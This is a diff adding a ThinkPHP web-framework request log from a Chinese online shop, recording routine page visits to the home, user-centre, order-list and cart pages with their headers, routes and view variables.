+)
+[ info ] [ PARAM ] array (
+  'index/user/usercenter_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] /**
+     * 个人中心
+     * @author  ILsunshine
+     */
+Method [ <user> public method userCenter ] {
+  @@ E:\www\dbgj\application\index\controller\User.php 39 - 67
+}
+
+[ info ] [ VIEW ] ./themes/default/index/user_center.html [ array (
+  0 => 'userinfo',
+  1 => 'tyjfmc',
+  2 => 'zhscore',
+  3 => 's_score',
+  4 => 'ytixian',
+  5 => 'tuijianren',
+  6 => 'userInfo',
+  7 => 'hys',
+  8 => 'scoreorder',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T16:26:27+08:00 ] 172.31.179.54 144.0.158.44 GET /index/index/index.html
+[ log ] dbgj.hoonking.com/index/index/index.html [运行时间：0.078125s][吞吐率：12.80req/s] [内存消耗：2,218.20kb] [文件加载：53]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'index',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/index/user/usercenter.html',
+  'accept-encoding' => 'gzip, deflate, sdch',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=595p44kbkrtjvun47m4b5la135; __guid=25234792.1858396334813039900.1513067107563.5156; monitor_count=2',
+)
+[ info ] [ PARAM ] array (
+  'index/index/index_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] Method [ <user> public method index ] {
+  @@ E:\www\dbgj\application\index\controller\Index.php 21 - 28
+}
+
+[ info ] [ VIEW ] ./themes/default/index/index.html [ array (
+  0 => 'userinfo',
+  1 => 'goodslist',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T16:30:23+08:00 ] 172.31.179.54 144.0.158.44 GET /index/user/usercenter.html
+[ log ] dbgj.hoonking.com/index/user/usercenter.html [运行时间：0.140625s][吞吐率：7.11req/s] [内存消耗：2,294.27kb] [文件加载：53]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'user',
+    2 => 'usercenter',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/index/index/index.html',
+  'accept-encoding' => 'gzip, deflate, sdch',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=595p44kbkrtjvun47m4b5la135; __guid=25234792.1858396334813039900.1513067107563.5156; monitor_count=3',
+)
+[ info ] [ PARAM ] array (
+  'index/user/usercenter_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] /**
+     * 个人中心
+     * @author  ILsunshine
+     */
+Method [ <user> public method userCenter ] {
+  @@ E:\www\dbgj\application\index\controller\User.php 39 - 67
+}
+
+[ info ] [ VIEW ] ./themes/default/index/user_center.html [ array (
+  0 => 'userinfo',
+  1 => 'tyjfmc',
+  2 => 'zhscore',
+  3 => 's_score',
+  4 => 'ytixian',
+  5 => 'tuijianren',
+  6 => 'userInfo',
+  7 => 'hys',
+  8 => 'scoreorder',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T16:35:25+08:00 ] 172.31.179.54 144.0.158.44 GET /index/index/index.html
+[ log ] dbgj.hoonking.com/index/index/index.html [运行时间：0.062500s][吞吐率：16.00req/s] [内存消耗：2,218.20kb] [文件加载：53]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'index',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/index/user/usercenter.html',
+  'accept-encoding' => 'gzip, deflate, sdch',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=595p44kbkrtjvun47m4b5la135; __guid=25234792.1858396334813039900.1513067107563.5156; monitor_count=4',
+)
+[ info ] [ PARAM ] array (
+  'index/index/index_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] Method [ <user> public method index ] {
+  @@ E:\www\dbgj\application\index\controller\Index.php 21 - 28
+}
+
+[ info ] [ VIEW ] ./themes/default/index/index.html [ array (
+  0 => 'userinfo',
+  1 => 'goodslist',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T16:35:28+08:00 ] 172.31.179.54 144.0.158.44 GET /index/order/orderlists.html
+[ log ] dbgj.hoonking.com/index/order/orderlists.html [运行时间：0.078125s][吞吐率：12.80req/s] [内存消耗：2,281.50kb] [文件加载：57]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'order',
+    2 => 'orderlists',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/index/index/index.html',
+  'accept-encoding' => 'gzip, deflate, sdch',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=595p44kbkrtjvun47m4b5la135; __guid=25234792.1858396334813039900.1513067107563.5156; monitor_count=5',
+)
+[ info ] [ PARAM ] array (
+  'index/order/orderlists_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] /**
+     * 个人订单
+     * @author ILsunshien
+     */
+Method [ <user> public method orderLists ] {
+  @@ E:\www\dbgj\application\index\controller\Order.php 25 - 52
+}
+
+[ info ] [ VIEW ] ./themes/default/index/user_order.html [ array (
+  0 => 'userinfo',
+  1 => 'tyjfmc',
+  2 => 'page',
+  3 => 'lists',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T16:35:32+08:00 ] 172.31.179.54 144.0.158.44 GET /index/redenvelope/index.html
+[ log ] dbgj.hoonking.com/index/redenvelope/index.html [运行时间：0.031250s][吞吐率：32.00req/s] [内存消耗：1,789.15kb] [文件加载：44]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'redenvelope',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/index/order/orderlists.html',
+  'accept-encoding' => 'gzip, deflate, sdch',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=595p44kbkrtjvun47m4b5la135; __guid=25234792.1858396334813039900.1513067107563.5156; monitor_count=6',
+)
+[ info ] [ PARAM ] array (
+  'index/redenvelope/index_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T16:35:35+08:00 ] 172.31.179.54 144.0.158.44 GET /index/order/orderlists.html
+[ log ] dbgj.hoonking.com/index/order/orderlists.html [运行时间：0.078125s][吞吐率：12.80req/s] [内存消耗：2,281.50kb] [文件加载：57]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'order',
+    2 => 'orderlists',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/index/index/index.html',
+  'accept-encoding' => 'gzip, deflate, sdch',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=595p44kbkrtjvun47m4b5la135; __guid=25234792.1858396334813039900.1513067107563.5156; monitor_count=7',
+)
+[ info ] [ PARAM ] array (
+  'index/order/orderlists_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] /**
+     * 个人订单
+     * @author ILsunshien
+     */
+Method [ <user> public method orderLists ] {
+  @@ E:\www\dbgj\application\index\controller\Order.php 25 - 52
+}
+
+[ info ] [ VIEW ] ./themes/default/index/user_order.html [ array (
+  0 => 'userinfo',
+  1 => 'tyjfmc',
+  2 => 'page',
+  3 => 'lists',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T16:35:37+08:00 ] 172.31.179.54 144.0.158.44 GET /index/cart/index.html
+[ log ] dbgj.hoonking.com/index/cart/index.html [运行时间：0.046875s][吞吐率：21.33req/s] [内存消耗：2,225.05kb] [文件加载：53]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'cart',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/index/order/orderlists.html',
+  'accept-encoding' => 'gzip, deflate, sdch',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=595p44kbkrtjvun47m4b5la135; __guid=25234792.1858396334813039900.1513067107563.5156; monitor_count=8',
+)
+[ info ] [ PARAM ] array (
+  'index/cart/index_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] /**
+	* 购物车首页
+	* @author tangtanglove
+	*/
+Method [ <user> public method index ] {
+  @@ E:\www\dbgj\application\index\controller\Cart.php 24 - 68
+}
+
+[ info ] [ VIEW ] ./themes/default/index/cart_index.html [ array (
+  0 => 'userinfo',
+  1 => 'tyjfmc',
+  2 => 'cartMoney',
+  3 => 'selectGoods',
+  4 => 'lists',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T16:35:39+08:00 ] 172.31.179.54 144.0.158.44 GET /index/order/orderlists.html
+[ log ] dbgj.hoonking.com/index/order/orderlists.html [运行时间：0.062500s][吞吐率：16.00req/s] [内存消耗：2,281.50kb] [文件加载：57]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'order',
+    2 => 'orderlists',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/index/index/index.html',
+  'accept-encoding' => 'gzip, deflate, sdch',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=595p44kbkrtjvun47m4b5la135; __guid=25234792.1858396334813039900.1513067107563.5156; monitor_count=9',
+)
+[ info ] [ PARAM ] array (
+  'index/order/orderlists_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] /**
+     * 个人订单
+     * @author ILsunshien
+     */
+Method [ <user> public method orderLists ] {
+  @@ E:\www\dbgj\application\index\controller\Order.php 25 - 52
+}
+
+[ info ] [ VIEW ] ./themes/default/index/user_order.html [ array (
+  0 => 'userinfo',
+  1 => 'tyjfmc',
+  2 => 'page',
+  3 => 'lists',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T16:35:40+08:00 ] 172.31.179.54 144.0.158.44 GET /index/user/usercenter.html
+[ log ] dbgj.hoonking.com/index/user/usercenter.html [运行时间：0.093750s][吞吐率：10.67req/s] [内存消耗：2,294.32kb] [文件加载：53]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'user',
+    2 => 'usercenter',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/index/order/orderlists.html',
+  'accept-encoding' => 'gzip, deflate, sdch',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=595p44kbkrtjvun47m4b5la135; __guid=25234792.1858396334813039900.1513067107563.5156; monitor_count=10',
+)
+[ info ] [ PARAM ] array (
+  'index/user/usercenter_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] /**
+     * 个人中心
+     * @author  ILsunshine
+     */
+Method [ <user> public method userCenter ] {
+  @@ E:\www\dbgj\application\index\controller\User.php 39 - 67
+}
+
+[ info ] [ VIEW ] ./themes/default/index/user_center.html [ array (
+  0 => 'userinfo',
+  1 => 'tyjfmc',
+  2 => 'zhscore',
+  3 => 's_score',
+  4 => 'ytixian',
+  5 => 'tuijianren',
+  6 => 'userInfo',
+  7 => 'hys',
+  8 => 'scoreorder',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T16:35:51+08:00 ] 172.31.179.54 144.0.158.44 GET /index/order/orderlists.html
+[ log ] dbgj.hoonking.com/index/order/orderlists.html [运行时间：0.078125s][吞吐率：12.80req/s] [内存消耗：2,281.50kb] [文件加载：57]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'order',
+    2 => 'orderlists',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/index/index/index.html',
+  'accept-encoding' => 'gzip, deflate, sdch',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=595p44kbkrtjvun47m4b5la135; __guid=25234792.1858396334813039900.1513067107563.5156; monitor_count=11',
+)
+[ info ] [ PARAM ] array (
+  'index/order/orderlists_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] /**
+     * 个人订单
+     * @author ILsunshien
+     */
+Method [ <user> public method orderLists ] {
+  @@ E:\www\dbgj\application\index\controller\Order.php 25 - 52
+}
+
+[ info ] [ VIEW ] ./themes/default/index/user_order.html [ array (
+  0 => 'userinfo',
+  1 => 'tyjfmc',
+  2 => 'page',
+  3 => 'lists',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T16:35:52+08:00 ] 172.31.179.54 144.0.158.44 GET /index/index/index.html
+[ log ] dbgj.hoonking.com/index/index/index.html [运行时间：0.062500s][吞吐率：16.00req/s] [内存消耗：2,218.20kb] [文件加载：53]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'index',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/index/user/usercenter.html',
+  'accept-encoding' => 'gzip, deflate, sdch',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=595p44kbkrtjvun47m4b5la135; __guid=25234792.1858396334813039900.1513067107563.5156; monitor_count=12',
+)
+[ info ] [ PARAM ] array (
+  'index/index/index_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] Method [ <user> public method index ] {
+  @@ E:\www\dbgj\application\index\controller\Index.php 21 - 28
+}
+
+[ info ] [ VIEW ] ./themes/default/index/index.html [ array (
+  0 => 'userinfo',
+  1 => 'goodslist',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T16:35:53+08:00 ] 172.31.179.54 144.0.158.44 GET /index/index/index.html
+[ log ] dbgj.hoonking.com/index/index/index.html [运行时间：0.062500s][吞吐率：16.00req/s] [内存消耗：2,218.22kb] [文件加载：53]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'index',
+    2 => 'index',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/index/index/index.html',
+  'accept-encoding' => 'gzip, deflate, sdch',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'cookie' => 'think_var=zh-cn; PHPSESSID=595p44kbkrtjvun47m4b5la135; __guid=25234792.1858396334813039900.1513067107563.5156; monitor_count=13',
+)
+[ info ] [ PARAM ] array (
+  'index/index/index_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] Method [ <user> public method index ] {
+  @@ E:\www\dbgj\application\index\controller\Index.php 21 - 28
+}
+
+[ info ] [ VIEW ] ./themes/default/index/index.html [ array (
+  0 => 'userinfo',
+  1 => 'goodslist',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T17:35:08+08:00 ] 172.31.179.54 144.0.158.44 GET /favicon.ico
+[ log ] dbgj.hoonking.com/favicon.ico [运行时间：0.046875s][吞吐率：21.33req/s] [内存消耗：1,774.26kb] [文件加载：41]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'favicon.ico',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
+  'accept-encoding' => 'gzip, deflate, sdch',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'cookie' => 'PHPSESSID=595p44kbkrtjvun47m4b5la135; __guid=25234792.1858396334813039900.1513067107563.5156; monitor_count=14',
+)
+[ info ] [ PARAM ] array (
+  'favicon_ico' => '',
+)
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T17:37:25+08:00 ] 172.31.179.54 144.0.158.44 GET /
+[ log ] dbgj.hoonking.com/ [运行时间：0.062500s][吞吐率：16.00req/s] [内存消耗：2,214.82kb] [文件加载：53]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'accept-encoding' => 'gzip, deflate, sdch',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'cookie' => 'PHPSESSID=595p44kbkrtjvun47m4b5la135; __guid=25234792.1858396334813039900.1513067107563.5156; monitor_count=14; think_var=zh-cn',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] Method [ <user> public method index ] {
+  @@ E:\www\dbgj\application\index\controller\Index.php 21 - 28
+}
+
+[ info ] [ VIEW ] ./themes/default/index/index.html [ array (
+  0 => 'userinfo',
+  1 => 'goodslist',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T17:37:27+08:00 ] 172.31.179.54 144.0.158.44 GET /index/user/usercenter.html
+[ log ] dbgj.hoonking.com/index/user/usercenter.html [运行时间：0.171875s][吞吐率：5.82req/s] [内存消耗：2,294.30kb] [文件加载：53]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'user',
+    2 => 'usercenter',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+  'referer' => 'http://dbgj.hoonking.com/',
+  'accept-encoding' => 'gzip, deflate, sdch',
+  'accept-language' => 'zh-CN,zh;q=0.8',
+  'cookie' => 'PHPSESSID=595p44kbkrtjvun47m4b5la135; __guid=25234792.1858396334813039900.1513067107563.5156; think_var=zh-cn; monitor_count=15',
+)
+[ info ] [ PARAM ] array (
+  'index/user/usercenter_html' => '',
+)
+[ info ] [ LANG ] E:\www\dbgj/application/index\lang\zh-cn.php
+[ info ] [ SESSION ] INIT array (
+  'prefix' => 'minishop',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] /**
+     * 个人中心
+     * @author  ILsunshine
+     */
+Method [ <user> public method userCenter ] {
+  @@ E:\www\dbgj\application\index\controller\User.php 39 - 67
+}
+
+[ info ] [ VIEW ] ./themes/default/index/user_center.html [ array (
+  0 => 'userinfo',
+  1 => 'tyjfmc',
+  2 => 'zhscore',
+  3 => 's_score',
+  4 => 'ytixian',
+  5 => 'tuijianren',
+  6 => 'userInfo',
+  7 => 'hys',
+  8 => 'scoreorder',
+) ]
+[ info ] [ LOG ] INIT file
+
+---------------------------------------------------------------
+[ 2017-12-12T19:37:28+08:00 ] 172.31.179.54 49.118.138.184 GET /
+[ log ] dbgj.hoonking.com/ [运行时间：0.062500s][吞吐率：16.00req/s] [内存消耗：2,198.18kb] [文件加载：54]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LANG ] E:\www\dbgj\core\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'dbgj.hoonking.com',
+  'connection' => 'keep-alive',
+  'upgrade-insecure-requests' => '1',
